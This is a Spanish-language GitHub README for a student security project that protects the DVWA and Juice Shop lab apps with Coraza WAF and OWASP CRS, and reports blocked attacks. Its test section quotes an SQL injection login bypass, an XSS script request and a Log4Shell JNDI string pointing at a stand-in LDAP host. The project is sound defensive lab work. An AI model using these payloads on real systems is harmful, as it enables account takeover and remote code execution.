# Protección contra Ataques Web con Coraza WAF y OWASP CRS

![Docker](https://img.shields.io/badge/Docker-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![Ubuntu](https://img.shields.io/badge/Ubuntu-E95420?style=for-the-badge&logo=ubuntu&logoColor=white)
![Security](https://img.shields.io/badge/Security-OWASP_CRS-red?style=for-the-badge)
![Grafana](https://img.shields.io/badge/Grafana-F46800?style=for-the-badge&logo=grafana&logoColor=white)

## Resumen del Proyecto
Despliegue de una arquitectura de ciberseguridad defensiva bajo un enfoque defesnvo, utilizando un Firewall de Aplicaciones Web (WAF) contenerizado para proteger infraestructuras híbridas. La solución se enfoca en la detección, registro y bloqueo automatizado del 100% de los ataques más críticos definidos en el OWASP Top 10.

El entorno fue implementado sobre Ubuntu Server 24.04 LTS y orquestado con Docker Compose, aplicando un endurecimiento (*hardening*) estricto de los contenedores y segmentando la red para cumplir con el principio de mínimo privilegio.

---

## Arquitectura de Red 
La infraestructura fue diseñada dividiendo los contenedores en tres redes lógicas y aisladas:

* 🌐 **Red `frontend` (Bridge Público):** Expuesta a internet, aloja el proxy inverso (Caddy) y la plataforma de visualización (Grafana).
* 🔒 **Red `backend` (Internal Bridge):** Red totalmente aislada que contiene las aplicaciones vulnerables objetivo (DVWA y OWASP Juice Shop). El tráfico web no puede llegar a ellas sin pasar obligatoriamente por el WAF.
* 📊 **Red `monitoring` (Bridge):** Aísla el motor de recolección de logs (Loki) para evitar la exposición de la telemetría a la red pública.

<img width="683" height="485" alt="image" src="https://github.com/user-attachments/assets/f805e2e5-ada2-46e9-a796-fde0fcf53fbd" />

### Stack Tecnológico
* **WAF:** Coraza WAF (Motor de inspección de alto rendimiento respaldado por OWASP Foundation).
* **Reglas de Seguridad:** OWASP Core Rule Set (CRS) v4 configurado en Nivel de Paranoia 2 (PL2).
* **Proxy Inverso:** Caddy Server (Gestión de tráfico HTTP/HTTPS).
* **Observabilidad:** Grafana + Loki (Docker Plugin).
* **Pentesting:** Burp Suite Professional y la herramienta `wrk`.

---

## Pruebas Ofensivas y Vulnerabilidades Bloqueadas

Para validar la eficacia del Parcheo Virtual y las reglas del WAF, se realizaron pruebas contra dos arquitecturas distintas: **DVWA** (aplicación monolítica tradicional en PHP) y **OWASP Juice Shop** (arquitectura moderna orientada a API REST y JSON).

### 1. Auditoría Automatizada (DVWA)
Se configuró un escaneo activo en Burp Suite Professional evaluando vectores de inyección, manipulación de rutas y ejecución de comandos. 

**Resultados sin WAF:** Se descubrieron 34 vulnerabilidades (13 críticas, 21 medias y 2 informativas).

**Resultados con WAF (Coraza + CRS PL2):** Bloqueo del 100% de los ataques. Las vulnerabilidades mitigadas incluyeron:

* **OS Command Injection:** Bloqueo de inyección de comandos a nivel de sistema operativo en el módulo `/vulnerabilities/exec/` a través del parámetro `ip`.
* **SQL Injection (SQLi):** Intercepción de inyecciones en el formulario de inicio de sesión (`username`) y en el buscador interno (`id`).
* **File Path Traversal:** Prevención de lectura de archivos sensibles del servidor manipulando el parámetro `page` en `/vulnerabilities/fi/`.
* **Cross-Site Scripting (XSS):** Bloqueo de XSS Almacenado en el parámetro `txtName` y XSS Reflejado en los parámetros `include`, `id` y `name`.
* **Ataques en Cabeceras y Cookies:** Neutralización de XSS inyectado directamente en la cookie HTTP `security` y en las cabeceras `Referer` y `User-Agent`.

### 2. Explotación Manual de API (OWASP Juice Shop)
Al tratarse de una aplicación Single Page Application (SPA), se utilizó el **Burp Suite Repeater** para realizar ataques precisos sobre la lógica de negocio y los endpoints REST.

* **Bypass de Autenticación (SQLi):** 
  * *Ataque:* Inyección del payload `' OR 1=1 --` directamente en el campo `email` del JSON de login.
  * *Mitigación:* El WAF detectó la ruptura de la cadena SQL y devolvió un `HTTP 403 Forbidden`, evitando el acceso no autorizado a la cuenta de administrador.
* **XSS Reflejado en Buscador:** 
  * *Ataque:* Envío de la petición `GET /rest/products/search?q=%3Cscript%3Ealert(1)%3C/script%3E`.
  * *Mitigación:* Coraza decodificó la URL e interceptó la etiqueta HTML maliciosa antes de que el backend pudiera procesarla.
* **Remote Command Execution (RCE / Log Injection):** 
  * *Ataque:* Modificación de la cabecera HTTP inyectando `${jndi:ldap://atrapado.com/a}` en el `User-Agent` para simular la explotación de **Log4Shell**.
  * *Mitigación:* El OWASP CRS analizó las cabeceras en la Fase 2, reconoció la firma de ejecución remota y destruyó el paquete HTTP para evitar el compromiso total del servidor.

### 3. Prueba de Estrés y Denegación de Servicio (DoS)
* Se utilizó la herramienta `wrk` desde Kali Linux para inyectar tráfico masivo (570 peticiones por segundo). 
* **Resultado:** La directiva de *Rate Limit* en Caddy funcionó de manera impecable. De 171,979 solicitudes enviadas, el proxy bloqueó 16,879, haciendo cumplir el límite estricto de **300 peticiones por minuto por IP** y manteniendo la disponibilidad de los servicios.

## Observabilidad (Grafana + Loki)
Toda la telemetría de seguridad es transformada en métricas de monitoreo. El Dashboard diseñado permite auditar:
* Picos de tráfico bloqueados por Rate Limiting.
* Distribución de ataques categorizados (SQLi, XSS, LFI/RFI, CSRF).
* Top 10 de reglas CRS activadas para facilitar el *Tuning* y reducir falsos positivos en entornos de producción.

---

## Integrantes:
* Ronald Hurtado
* Rafael Lau 
* Walter Melendez
* Yagami Meza
